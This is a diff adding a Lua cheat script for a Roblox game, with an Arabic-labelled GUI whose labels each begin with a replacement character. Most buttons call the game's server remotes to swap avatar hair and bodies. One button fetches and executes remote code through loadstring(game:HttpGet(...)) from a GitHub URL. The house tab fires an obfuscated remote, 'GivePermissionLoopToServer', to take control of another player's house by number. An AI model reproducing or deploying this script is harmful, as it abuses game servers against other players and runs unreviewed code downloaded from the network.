+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Imagnir/r6_anims_for_r15/main/r6_anims.lua', true))()
+    end,
+})
+v491:AddSection({
+    Name = '\u{fffd}\u{644}\u{627}\u{62d}\u{636}\u{629}: \u{627}\u{630}\u{627} \u{62c}\u{646}\u{62a} \u{62a}\u{631}\u{64a}\u{62f} \u{62a}\u{648}\u{62e}\u{631} \u{627}\u{644}\u{645}\u{634}\u{64a}\u{647} \u{644}\u{627}\u{632}\u{645} \u{62a}\u{637}\u{644}\u{639} \u{648}\u{62a}\u{641}\u{648}\u{62a} ',
+})
+
+sTab = v71:MakeTab({
+    Name = '\u{fffd}\u{644}\u{634}\u{639}\u{648}\u{631}',
+    Icon = 'rbxassetid://115714662895227',
+})
+
+sTab:AddButton({
+    Name = '\u{fffd}\u{62f}\u{645}\u{62c} \u{639}\u{627}\u{62f}\u{64a} \u{627}\u{633}\u{648}\u{62f}\u{3a9}',
+    Callback = function()
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({15535076528}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({16127830905}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({14808924884}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({15848163279}))
+    end,
+})
+sTab:AddButton({
+    Name = '\u{fffd}\u{62f}\u{645}\u{62c} \u{639}\u{627}\u{62f}\u{64a} \u{628}\u{646}\u{64a}\u{3a9}',
+    Callback = function()
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({14627143022}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({15294036713}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({15847969469}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({15971158257}))
+    end,
+})
+sTab:AddButton({
+    Name = '\u{fffd}\u{62f}\u{645}\u{62c} \u{639}\u{627}\u{62f}\u{64a} \u{627}\u{628}\u{64a}\u{636}\u{3a9}',
+    Callback = function()
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({14627127264}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({15908583844}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({14808889186}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({15349539978}))
+    end,
+})
+sTab:AddSection({
+    Name = '\u{fffd}\u{645}\u{62c} (9) \u{634}\u{639}\u{648}\u{631} \u{62d}\u{644}\u{648}',
+})
+sTab:AddButton({
+    Name = '\u{fffd}\u{62f}\u{645}\u{62c} \u{627}\u{633}\u{648}\u{62f} 9 \u{634}\u{639}\u{648}\u{631}\u{3a9}',
+    Callback = function()
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({89963641541698}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({15214479618}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({16168983297}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({12553856439}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({12411026610}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({15848163279}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({15294026484}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({11386780095}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({15303551954}))
+    end,
+})
+sTab:AddButton({
+    Name = '\u{fffd}\u{62f}\u{645}\u{62c} \u{627}\u{628}\u{64a}\u{636} 9 \u{634}\u{639}\u{648}\u{631}\u{3a9}',
+    Callback = function()
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({12395782823}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({15530780426}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({14808889186}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({16127870253}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({15848173823}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({12553870762}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({12411004315}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({14887721871}))
+    end,
+})
+sTab:AddButton({
+    Name = '\u{fffd}\u{62f}\u{645}\u{62c} \u{627}\u{633}\u{648}\u{62f} 9 \u{634}\u{639}\u{648}\u{631}\u{3a9}',
+    Callback = function()
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({15908581067}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({12410997561}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({15360967485}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({12553878346}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({16127867077}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({15294007958}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({15696510459}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({11386778657}))
+    end,
+})
+sTab:AddButton({
+    Name = '\u{fffd}\u{62f}\u{645}\u{62c} \u{627}\u{633}\u{648}\u{62f} 9 \u{634}\u{639}\u{648}\u{631} \u{646}\u{648}\u{639} \u{62b}\u{627}\u{646}\u{64a} \u{3a9}',
+    Callback = function()
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({89963641541698}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({15214479618}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({12411026610}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({16168983297}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({15848163279}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({12553856439}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({16752451901}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({15303551954}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({11386780095}))
+    end,
+})
+sTab:AddButton({
+    Name = '\u{fffd}\u{62f}\u{645}\u{62c} \u{627}\u{634}\u{642}\u{631} 9 \u{634}\u{639}\u{648}\u{631} \u{646}\u{648}\u{639} \u{62b}\u{627}\u{646}\u{64a}\u{3a9}',
+    Callback = function()
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({14887721871}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({12411004315}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({12553870762}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({15848173823}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({16127870253}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({17374012310}))
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({15530780426}))
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({12395782823}))
+    end,
+})
+
+HTab = v71:MakeTab({
+    Name = '\u{fffd}\u{644}\u{627}\u{62c}\u{640}\u{633}\u{627}\u{645}',
+    Icon = 'rbxassetid://115714662895227',
+})
+
+HTab:AddSection({
+    Name = '\u{fffd}\u{644}\u{631}\u{626}\u{640}\u{648}\u{633} \u{640} \u{627}\u{644}\u{627}\u{631}\u{62c}\u{640}\u{644}',
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{631}\u{62c}\u{644} \u{645}\u{642}\u{637}\u{648}\u{639}\u{647} \u{644}\u{644}\u{628}\u{646}\u{627}\u{62a}\u{3a9} ',
+    Callback = function()
+        print('Clicked')
+
+        local v532 = {
+            {
+                96491916349570,
+                76683091425509,
+                75159926897589,
+                139607718,
+                1,
+                1,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v532))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{631}\u{62c}\u{644} \u{645}\u{642}\u{637}\u{648}\u{639}\u{647} \u{644}\u{644} \u{648}\u{644}\u{62f}\u{3a9} ',
+    Callback = function()
+        print('Clicked')
+
+        local v533 = {
+            {
+                1,
+                1,
+                1,
+                139607718,
+                1,
+                1,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v533))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{623}\u{633} \u{631}\u{648}\u{628}\u{648}\u{62a}',
+    Callback = function()
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({3210773801}))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{623}\u{633} \u{645}\u{62e}\u{641}\u{64a}',
+    Callback = function()
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({134082579}))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{623}\u{633} \u{643}\u{648}\u{628}\u{64a} |\u{631}\u{648}\u{644}',
+    Callback = function()
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({746767604}))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{623}\u{633} \u{639}\u{64a}\u{648}\u{646} \u{632}\u{631}\u{642}\u{627}\u{621}',
+    Callback = function()
+        wait(0.1)
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('Wear', 9000000000):InvokeServer(unpack({16580493236}))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{631}\u{62c}\u{644} \u{62d}\u{62f}\u{64a}\u{62f}\u{64a}\u{629}\u{3a9} ',
+    Callback = function()
+        print('Clicked')
+
+        local v534 = {
+            {
+                1,
+                1,
+                1,
+                17500249989,
+                1,
+                1,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v534))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{631}\u{62c}\u{644} \u{627}\u{644}\u{639}\u{636}\u{627}\u{645} \u{627}\u{644}\u{628}\u{64a}\u{636}\u{627}\u{621}\u{3a9} ',
+    Callback = function()
+        print('Clicked')
+
+        local v535 = {
+            {
+                1,
+                1,
+                1,
+                14580308646,
+                1,
+                1,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v535))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{631}\u{62c}\u{644} \u{627}\u{644}\u{639}\u{636}\u{627}\u{645} \u{627}\u{644}\u{627}\u{633}\u{648}\u{62f}\u{3a9} ',
+    Callback = function()
+        print('Clicked')
+
+        local v536 = {
+            {
+                1,
+                1,
+                1,
+                14547162578,
+                1,
+                1,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v536))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{631}\u{62c}\u{644} \u{631}\u{648}\u{644}\u{3a9} ',
+    Callback = function()
+        print('Clicked')
+
+        local v537 = {
+            {
+                1,
+                1,
+                1,
+                3230472745,
+                3230470862,
+                1,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v537))
+    end,
+})
+HTab:AddSection({
+    Name = '\u{fffd}\u{62c}\u{633}\u{627}\u{645} \u{628}\u{646}\u{640}\u{627}\u{62a}',
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{62c}\u{633}\u{645} \u{628}\u{646}\u{62a} \u{62e}\u{635}\u{631} \u{635}\u{63a}\u{64a}\u{631}\u{3a9} ',
+    Callback = function()
+        print('Clicked')
+
+        local v538 = {
+            {
+                96491916349570,
+                76683091425509,
+                75159926897589,
+                1,
+                1,
+                1,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v538))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{62c}\u{633}\u{645} \u{628}\u{646}\u{62a} \u{62e}\u{635}\u{631} \u{636}\u{639}\u{64a}\u{641}\u{3a9} ',
+    Callback = function()
+        print('Clicked')
+
+        local v539 = {
+            {
+                74302534603111,
+                76683091425509,
+                75159926897589,
+                1,
+                1,
+                1,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v539))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{62c}\u{633}\u{645} \u{628}\u{646}\u{62a} 1\u{3a9} ',
+    Callback = function()
+        print('Clicked')
+
+        local v540 = {
+            {
+                96491916349570,
+                14854350570,
+                14854350451,
+                1,
+                1,
+                1,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v540))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{62c}\u{633}\u{645} \u{628}\u{646}\u{62a} 2\u{3a9} ',
+    Callback = function()
+        print('Clicked')
+
+        local v541 = {
+            {
+                16214246112,
+                16214249513,
+                16214251181,
+                1,
+                1,
+                1,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v541))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{62c}\u{633}\u{645} \u{628}\u{646}\u{62a} 3\u{3a9} ',
+    Callback = function()
+        print('Clicked')
+
+        local v542 = {
+            {
+                15539008532,
+                15539008875,
+                15539008680,
+                15539008795,
+                15539011945,
+                1,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v542))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{62c}\u{633}\u{645} \u{628}\u{646}\u{62a} 4\u{3a9} ',
+    Callback = function()
+        print('Clicked')
+
+        local v543 = {
+            {
+                14861800638,
+                14861800626,
+                14861801452,
+                14861800627,
+                14861801454,
+                1,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v543))
+    end,
+})
+HTab:AddSection({
+    Name = '\u{fffd}\u{62c}\u{633}\u{627}\u{645} \u{627}\u{648}\u{644}\u{627}\u{62f}',
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{62c}\u{633}\u{645} \u{627}\u{648}\u{644}\u{627}\u{62f}. s15\u{3a9} ',
+    Callback = function()
+        print('Clicked')
+
+        local v544 = {
+            {
+                17754346388,
+                1,
+                1,
+                1,
+                1,
+                1,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v544))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{62c}\u{633}\u{645}  \u{648}\u{644}\u{62f} \u{636}\u{639}\u{64a}\u{641}\u{3a9} ',
+    Callback = function()
+        print('Clicked')
+
+        local v545 = {
+            {
+                92757812011061,
+                99519402284266,
+                115905570886697,
+                1,
+                1,
+                1,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v545))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{62c}\u{633}\u{645} \u{648}\u{644}\u{62f} \u{643}\u{648}\u{628}\u{64a}\u{3a9}',
+    Callback = function()
+        print('Clicked')
+
+        local v546 = {
+            {
+                86499666,
+                27112039,
+                27112052,
+                27112068,
+                27112056,
+                1,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v546))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{62c}\u{633}\u{645} \u{648}\u{644}\u{62f} \u{631}\u{648}\u{644}\u{3a9}',
+    Callback = function()
+        print('Clicked')
+
+        local v547 = {
+            {
+                27112025,
+                27112039,
+                27112052,
+                3230472745,
+                3230470862,
+                1,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v547))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{62c}\u{633}\u{645} \u{648}\u{644}\u{62f} \u{645}\u{639}\u{636}\u{644}\u{3a9}',
+    Callback = function()
+        print('Clicked')
+
+        local v548 = {
+            {
+                18178775358,
+                18178775182,
+                18178775725,
+                18178777453,
+                18178775695,
+                1,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v548))
+    end,
+})
+HTab:AddSection({
+    Name = '\u{fffd}\u{62c}\u{633}\u{627}\u{645} \u{627}\u{642}\u{632}\u{627}\u{645}',
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{62c}\u{640}\u{633}\u{645} \u{627}\u{644}\u{642}\u{632}\u{645}\u{3a9}',
+    Callback = function()
+        print('Clicked')
+
+        local v549 = {
+            {
+                14579958702,
+                14579959062,
+                14579959191,
+                14579959249,
+                14579963667,
+                1,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v549))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{62c}\u{640}\u{633}\u{645} \u{627}\u{644}\u{642}\u{632}\u{645} \u{627}\u{644}\u{645}\u{62a}\u{648}\u{633}\u{640}\u{637}\u{3a9}',
+    Callback = function()
+        print('Clicked')
+
+        local v550 = {
+            {
+                77813057823038,
+                135110043370135,
+                116607813654019,
+                138966229804486,
+                128961183894053,
+                1,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v550))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{62c}\u{640}\u{633}\u{645} \u{627}\u{644}\u{642}\u{632}\u{645} \u{627}\u{644}\u{642}\u{635}\u{64a}\u{631}\u{3a9}',
+    Callback = function()
+        print('Clicked')
+
+        local v551 = {
+            {
+                120973199097564,
+                118345433416023,
+                112849465115864,
+                78321005147549,
+                106586789635639,
+                1,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v551))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{62c}\u{640}\u{633}\u{645} \u{627}\u{644}\u{642}\u{632}\u{645} \u{3a9}',
+    Callback = function()
+        print('Clicked')
+
+        local v552 = {
+            {
+                126267841602936,
+                77530451194918,
+                123471958406889,
+                117042768644173,
+                131948590344338,
+                1,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v552))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{62c}\u{640}\u{633}\u{645} \u{627}\u{644}\u{647}\u{627}\u{645}\u{633}\u{62a}\u{631}\u{3a9}',
+    Callback = function()
+        print('Clicked')
+
+        local v553 = {
+            {
+                14898536974,
+                14898536957,
+                14898537277,
+                14898537300,
+                14898537292,
+                14898536975,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v553))
+    end,
+})
+HTab:AddSection({
+    Name = '\u{fffd}\u{62c}\u{633}\u{627}\u{645} \u{63a}\u{631}\u{64a}\u{628}\u{647}',
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{633}\u{62a}\u{64a}\u{641}\u{3a9}',
+    Callback = function()
+        print('Clicked')
+
+        local v554 = {
+            {
+                14976595538,
+                14976595831,
+                14976595559,
+                14976595617,
+                14976595675,
+                134082579,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v554))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{639}\u{646}\u{643}\u{628}\u{648}\u{62a}\u{3a9}',
+    Callback = function()
+        print('Clicked')
+
+        local v555 = {
+            {
+                17047437188,
+                17047437378,
+                17047437442,
+                17047437366,
+                17047437217,
+                17047437225,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v555))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{62f}\u{64a}\u{646}\u{635}\u{648}\u{631}\u{3a9}',
+    Callback = function()
+        print('Clicked')
+
+        local v556 = {
+            {
+                3210533212,
+                3203439803,
+                3203438798,
+                3203440611,
+                3203443647,
+                3203436750,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v556))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{642}\u{631}\u{648}\u{64a}\u{3a9}',
+    Callback = function()
+        print('Clicked')
+
+        local v557 = {
+            {
+                74148072333019,
+                105051845347092,
+                103317093565994,
+                123546781151669,
+                110417909019083,
+                140062839549195,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v557))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{643}\u{631}\u{633}\u{64a}\u{3a9}',
+    Callback = function()
+        print('Clicked')
+
+        local v558 = {
+            {
+                16872133248,
+                16872133982,
+                16872133723,
+                16872133730,
+                16872133733,
+                134082579,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v558))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{647}\u{627}\u{644}\u{643}\u{3a9}',
+    Callback = function()
+        print('Clicked')
+
+        local v559 = {
+            {
+                105938035513300,
+                120682289281525,
+                78459091342559,
+                119167161940457,
+                78171925423915,
+                92193892051712,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v559))
+    end,
+})
+HTab:AddButton({
+    Name = '\u{fffd}\u{631}\u{64a}\u{628}\u{648}\u{62a}\u{3a9}',
+    Callback = function()
+        print('Clicked')
+
+        local v560 = {
+            {
+                14776593226,
+                14776227941,
+                14776227816,
+                102149844389538,
+                102624006545764,
+                74920391713702,
+            },
+        }
+
+        game:GetService('ReplicatedStorage'):WaitForChild('Remotes', 9000000000):WaitForChild('ChangeCharacterBody', 9000000000):InvokeServer(unpack(v560))
+    end,
+})
+
+HouseTab = v71:MakeTab({
+    Name = '\u{fffd}\u{644}\u{628}\u{64a}\u{648}\u{62a}',
+    Icon = 'rbxassetid://115714662895227',
+})
+
+HouseTab:AddSection({
+    Name = '\u{fffd}\u{643} \u{627}\u{644}\u{628}\u{627}\u{646}\u{62f} \u{648}\u{627}\u{62e}\u{630} \u{62a}\u{62d}\u{643}\u{645}',
+})
+
+local u561 = nil
+
+HouseTab:AddTextbox({
+    Name = '\u{fffd}\u{62f}\u{62e}\u{644} \u{631}\u{642}\u{645} \u{627}\u{644}\u{628}\u{64a}\u{62a}',
+    Default = '',
+    TextDisappear = false,
+    Callback = function(p562)
+        u561 = tonumber(p562)
+    end,
+})
+HouseTab:AddButton({
+    Name = '\u{fffd}\u{62e}\u{630} \u{62a}\u{62d}\u{643}\u{645}',
+    Callback = function()
+        if u561 then
+            local v563 = {
+                'GivePermissionLoopToServer',
+                game:GetService('Players').LocalPlayer,
+                u561,
+            }
+
+            game:GetService('ReplicatedStorage').RE:FindFirstChild('1Playe1rTrigge1rEven1t'):FireServer(unpack(v563))
+        else
+            print('Nenhum n\u{fa}mero de casa selecionado.')
+        end
+
+        print('Clicked!')
+    end,
+})
+HouseTab:AddSection({
